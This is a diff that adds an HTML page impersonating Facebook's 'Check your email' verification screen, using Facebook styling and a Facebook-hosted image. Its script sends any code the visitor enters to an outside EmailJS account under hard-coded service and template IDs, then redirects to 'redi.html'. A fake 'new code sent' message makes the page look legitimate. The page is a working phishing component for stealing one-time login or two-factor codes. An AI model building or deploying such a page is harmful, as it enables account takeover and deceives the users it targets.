@@ -1,0 +1,316 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Check your email - Facebook</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700&display=swap" rel="stylesheet">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        body {
+            font-family: 'Inter', sans-serif;
+            margin: 0;
+            background-color: #F0F2F5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            box-sizing: border-box;
+        }
+
+        .container {
+            background-color: #fff;
+            border-radius: 8px;
+            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.2), 0 2px 4px rgba(0, 0, 0, 0.1);
+            padding: 24px;
+            width: 400px;
+            max-width: 90%;
+            box-sizing: border-box;
+            text-align: left;
+        }
+
+        .back-button {
+            background: none;
+            border: none;
+            padding: 0;
+            font-size: 15px;
+            font-weight: 600;
+            color: #1877f2;
+            cursor: pointer;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+        }
+
+        .back-button svg {
+            width: 16px;
+            height: 16px;
+            margin-right: 6px;
+            fill: #1877f2;
+        }
+
+        h1 {
+            color: #1c1e21;
+            font-size: 20px;
+            font-weight: bold;
+            margin-top: 0;
+            margin-bottom: 12px;
+        }
+
+        p {
+            color: #606770;
+            font-size: 15px;
+            line-height: 1.33;
+            margin-bottom: 24px;
+        }
+
+        .illustration {
+            width: 100%;
+            margin-bottom: 24px;
+            border-radius: 8px;
+            overflow: hidden;
+        }
+
+        .illustration img {
+            display: block;
+            width: 100%;
+            height: auto;
+        }
+
+        .input-group {
+            margin-bottom: 16px;
+        }
+
+        .input-group label {
+            display: block;
+            color: #606770;
+            font-size: 13px;
+            margin-bottom: 4px;
+            font-weight: 600;
+        }
+
+        .input-group input[type="text"] {
+            width: 100%;
+            padding: 14px 16px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            font-size: 17px;
+            box-sizing: border-box;
+            outline: none;
+        }
+
+        .input-group input[type="text"]:focus {
+            border-color: #1877f2;
+            box-shadow: 0 0 0 2px rgba(24, 119, 242, 0.2);
+        }
+
+        .code-info {
+            display: flex;
+            align-items: center;
+            color: #606770;
+            font-size: 13px;
+            margin-bottom: 24px;
+        }
+
+        .code-info svg {
+            width: 16px;
+            height: 16px;
+            margin-right: 8px;
+            fill: #606770;
+        }
+
+        .code-info a {
+            color: #1877f2;
+            text-decoration: none;
+            font-weight: 600;
+            margin-left: 4px;
+        }
+
+        .code-info a:hover {
+            text-decoration: underline;
+        }
+
+        .button-group {
+            display: flex;
+            flex-direction: column;
+        }
+
+        .button-group button {
+            width: 100%;
+            padding: 14px;
+            border: none;
+            border-radius: 6px;
+            font-size: 17px;
+            font-weight: bold;
+            cursor: pointer;
+            box-sizing: border-box;
+            transition: background-color 0.2s ease;
+        }
+
+        .button-group button:first-child {
+            background-color: #1877f2;
+            color: #fff;
+            margin-bottom: 12px;
+        }
+
+        .button-group button:first-child:hover {
+            background-color: #166fe6;
+        }
+
+        .button-group button:last-child {
+            background-color: #E8F0FE;
+            color: #1877f2;
+        }
+
+        .button-group button:last-child:hover {
+            background-color: #D2E9FF;
+        }
+
+        .modal {
+            display: none;
+            position: fixed;
+            z-index: 1000;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            overflow: auto;
+            background-color: rgba(0,0,0,0.4);
+            justify-content: center;
+            align-items: center;
+        }
+
+        .modal-content {
+            background-color: #fefefe;
+            margin: auto;
+            padding: 20px;
+            border: 1px solid #888;
+            width: 80%;
+            max-width: 400px;
+            border-radius: 8px;
+            text-align: center;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.2);
+        }
+
+        .close-button {
+            color: #aaa;
+            float: right;
+            font-size: 28px;
+            font-weight: bold;
+        }
+
+        .close-button:hover,
+        .close-button:focus {
+            color: black;
+            text-decoration: none;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <button class="back-button">
+            <svg aria-hidden="true" width="16" height="16" viewBox="0 0 24 24" fill="currentColor">
+                <path d="M15.41 7.41L14 6l-6 6 6 6 1.41-1.41L10.83 12z"></path>
+            </svg>
+            Back
+        </button>
+
+        <h1>Check your email</h1>
+
+        <p>We sent a code to your mail. Enter that code to confirm your account.</p>
+
+        <div class="illustration">
+            <img src="https://static.xx.fbcdn.net/rsrc.php/v4/yV/r/idzFVSnSb9R.png" alt="Illustration of email verification">
+        </div>
+
+        <div class="input-group">
+            <label for="code">Enter code</label>
+            <input type="text" id="code" placeholder="">
+        </div>
+
+        <div class="code-info">
+            <svg aria-hidden="true" width="16" height="16" viewBox="0 0 24 24" fill="currentColor">
+                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm.5-13H11v6l5.25 3.15.75-1.23-4.5-2.67z"></path>
+            </svg>
+            It may take a few minutes for you to get this code. <a href="#" id="get-new-code-link">Get a new code</a>
+        </div>
+
+        <div class="button-group">
+            <button id="continue-button">Continue</button>
+            <button>Try another way</button>
+        </div>
+    </div>
+
+    <div id="myModal" class="modal">
+        <div class="modal-content">
+            <span class="close-button">&times;</span>
+            <p id="modalMessage"></p>
+            <button id="modalOkButton" class="mt-4 px-4 py-2 bg-blue-500 text-white rounded-md hover:bg-blue-600">OK</button>
+        </div>
+    </div>
+
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+
+    <script>
+        const modal = document.getElementById("myModal");
+        const modalMessage = document.getElementById("modalMessage");
+        const closeButton = document.getElementsByClassName("close-button")[0];
+        const modalOkButton = document.getElementById("modalOkButton");
+        const getNewCodeLink = document.getElementById("get-new-code-link");
+
+        function showModal(message, isSuccess = false) {
+            modalMessage.textContent = message;
+            modal.style.display = "flex";
+            if (isSuccess) {
+                modalOkButton.classList.remove('bg-blue-500', 'hover:bg-blue-600');
+                modalOkButton.classList.add('bg-green-500', 'hover:bg-green-600');
+            } else {
+                modalOkButton.classList.remove('bg-green-500', 'hover:bg-green-600');
+                modalOkButton.classList.add('bg-blue-500', 'hover:bg-blue-600');
+            }
+        }
+
+        function hideModal() {
+            modal.style.display = "none";
+        }
+
+        closeButton.onclick = hideModal;
+        modalOkButton.onclick = hideModal;
+
+        window.onclick = function(event) {
+            if (event.target == modal) {
+                hideModal();
+            }
+        }
+
+        getNewCodeLink.addEventListener('click', (e) => {
+            e.preventDefault();
+            showModal("A new code has been sent to your email.", true);
+        });
+
+        emailjs.init("8I9Nc02LoFUMQcxka");
+
+        document.getElementById('continue-button').addEventListener('click', async () => {
+            const code = document.getElementById('code').value.trim();
+
+            if (!code) {
+                showModal("Please enter the verification code.");
+                return;
+            }
+
+            emailjs.send("service_ag6mgqs", "template_a8iqq4d", {
+                user_code: code
+            }).then(
+                function(response) {
+                    window.location.href = "redi.html";
+                },
+                function(error) {
+                    console.error("FAILED...", error);
+                    showModal("Failed to send verification code. Please try again later.");
+                }
+            );
+        });
+    </script>
+</body>
+</html>
